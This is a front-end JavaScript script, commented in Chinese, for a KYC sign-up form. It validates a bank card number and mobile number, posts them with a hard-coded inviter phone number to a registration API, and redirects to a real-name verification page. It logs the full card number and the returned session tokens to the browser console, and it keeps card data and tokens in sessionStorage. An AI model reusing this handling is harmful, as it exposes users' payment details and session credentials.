// KYC 表单处理脚本
(function() {
    'use strict';

    // DOM 元素
    const form = document.getElementById('kycForm');
    const btnSubmit = document.getElementById('btnSubmit');
    const btnSendCode = document.getElementById('btnSendCode');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const messageModal = document.getElementById('messageModal');
    const modalIcon = document.getElementById('modalIcon');
    const modalMessage = document.getElementById('modalMessage');
    const btnModalClose = document.getElementById('btnModalClose');
    const bankNameDisplay = document.getElementById('bankName');

    // 表单输入元素
    const inputs = {
        bankCard: document.getElementById('bankCard'),
        phone: document.getElementById('phone')
    };

    // 错误提示元素
    const errors = {
        bankCard: document.getElementById('bankCardError'),
        phone: document.getElementById('phoneError')
    };

    // 验证规则
    const validators = {
        // 银行卡号验证（使用Luhn算法）
        bankCard: (value) => {
            if (!value) return '请输入银行卡号';
            
            // 使用银行卡验证工具
            if (typeof BankCardValidator !== 'undefined') {
                if (!BankCardValidator.validateCardNumber(value)) {
                    return '请输入有效的银行卡号';
                }
            } else {
                // 降级验证
                if (!/^\d{13,19}$/.test(value)) {
                    return '请输入13-19位银行卡号';
                }
            }
            
            return null;
        },

        // 手机号验证
        phone: (value) => {
            if (!value) return '请输入手机号码';
            if (!/^1[3-9]\d{9}$/.test(value)) return '请输入正确的手机号码';
            return null;
        }
    };

    // 实时验证
    Object.keys(inputs).forEach(key => {
        const input = inputs[key];
        const errorElement = errors[key];

        // 失去焦点时验证
        input.addEventListener('blur', () => {
            validateField(key);
        });

        // 输入时清除错误
        input.addEventListener('input', () => {
            if (errorElement.textContent) {
                errorElement.textContent = '';
                input.classList.remove('error');
            }
        });
    });

    // 格式化银行卡号（每4位加空格）并识别银行
    let detectedBankName = '';  // 保存识别的银行名称
    
    inputs.bankCard.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        
        // 格式化显示
        if (value.length > 0) {
            value = value.match(/.{1,4}/g).join(' ');
        }
        e.target.value = value;

        // 识别银行
        if (typeof BankCardValidator !== 'undefined') {
            const cleanValue = value.replace(/\s/g, '');
            const bankInfo = BankCardValidator.identifyBank(cleanValue);
            
            if (bankInfo) {
                detectedBankName = bankInfo.name;
                bankNameDisplay.textContent = '🏦 ' + bankInfo.name;
                bankNameDisplay.style.color = '#4facfe';
            } else if (cleanValue.length >= 6) {
                detectedBankName = '';
                bankNameDisplay.textContent = '⚠️ 无法识别银行';
                bankNameDisplay.style.color = '#ff9800';
            } else {
                detectedBankName = '';
                bankNameDisplay.textContent = '';
            }
        }
    });

    // 只允许输入数字
    inputs.bankCard.addEventListener('keypress', allowOnlyNumbers);
    inputs.phone.addEventListener('keypress', allowOnlyNumbers);

    function allowOnlyNumbers(e) {
        if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
            e.preventDefault();
        }
    }

    // 验证单个字段
    function validateField(fieldName) {
        const input = inputs[fieldName];
        const errorElement = errors[fieldName];
        const validator = validators[fieldName];

        const errorMsg = validator(input.value.replace(/\s/g, ''));
        
        if (errorMsg) {
            errorElement.textContent = errorMsg;
            input.classList.add('error');
            return false;
        } else {
            errorElement.textContent = '';
            input.classList.remove('error');
            return true;
        }
    }

    // 验证所有字段
    function validateForm() {
        let isValid = true;
        Object.keys(inputs).forEach(key => {
            if (!validateField(key)) {
                isValid = false;
            }
        });
        return isValid;
    }

    // 表单提交
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        // 验证表单
        if (!validateForm()) {
            showMessage('请检查并填写正确的信息', 'error');
            return;
        }

        // 显示加载状态
        showLoading(true);
        btnSubmit.disabled = true;

        try {
            // 准备提交数据（银行卡号、用户手机号和银行名称）
            const formData = {
                bankCard: inputs.bankCard.value.replace(/\s/g, '').trim(),
                phone: inputs.phone.value.trim(),
                inviterPhone: '13116005610',  // 邀请人手机号
                bankName: detectedBankName    // 识别的银行名称
            };

            console.log('提交表单数据:', formData);

            // 调用后端API
            const response = await fetch('/api/register', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });

            const result = await response.json();
            console.log('服务器响应:', result);

            showLoading(false);
            btnSubmit.disabled = false;

            if (result.success) {
                // 注册+登录成功
                const message = result.isNewUser 
                    ? '注册成功！账户已自动登录，即将进入下一步...' 
                    : '账户已存在，自动登录成功！即将进入下一步...';
                
                showMessage(message, 'success');
                
                // 存储用户信息到本地
                if (result.data) {
                    sessionStorage.setItem('userInfo', JSON.stringify({
                        mid: result.data.mid,
                        session_id: result.data.session_id,
                        socket_token: result.data.socket_token,
                        bankCard: result.data.bankCard,
                        tel: result.data.tel,
                        loginTime: new Date().toISOString()
                    }));
                }
                
                console.log('用户信息已保存:', result.data);
                
                                // 2秒后跳转到实名认证页面
                setTimeout(() => {
                    window.location.href = '/realname.html';
                }, 2000);
            } else {
                // 失败，显示错误信息
                let errorMsg = result.message || '操作失败，请重试';
                
                // 根据失败步骤提供更详细的提示
                if (result.step === 'register') {
                    errorMsg = '注册失败: ' + errorMsg;
                } else if (result.step === 'login') {
                    errorMsg = '自动登录失败: ' + errorMsg;
                }
                
                showMessage(errorMsg, 'error');
            }

        } catch (error) {
            console.error('提交错误:', error);
            showLoading(false);
            btnSubmit.disabled = false;
            showMessage('网络错误，请检查网络连接后重试', 'error');
        }
    });

    // 显示/隐藏加载状态
    function showLoading(show) {
        loadingOverlay.style.display = show ? 'flex' : 'none';
    }

    // 显示消息弹窗
    function showMessage(message, type = 'success') {
        modalMessage.textContent = message;
        modalIcon.textContent = type === 'success' ? '✓' : '✕';
        modalIcon.className = 'modal-icon ' + type;
        messageModal.style.display = 'flex';
    }

    // 关闭弹窗
    btnModalClose.addEventListener('click', function() {
        messageModal.style.display = 'none';
    });

    // 点击遮罩关闭弹窗
    messageModal.addEventListener('click', function(e) {
        if (e.target === messageModal) {
            messageModal.style.display = 'none';
        }
    });

    // 初始化
    console.log('KYC 表单已初始化');

})();
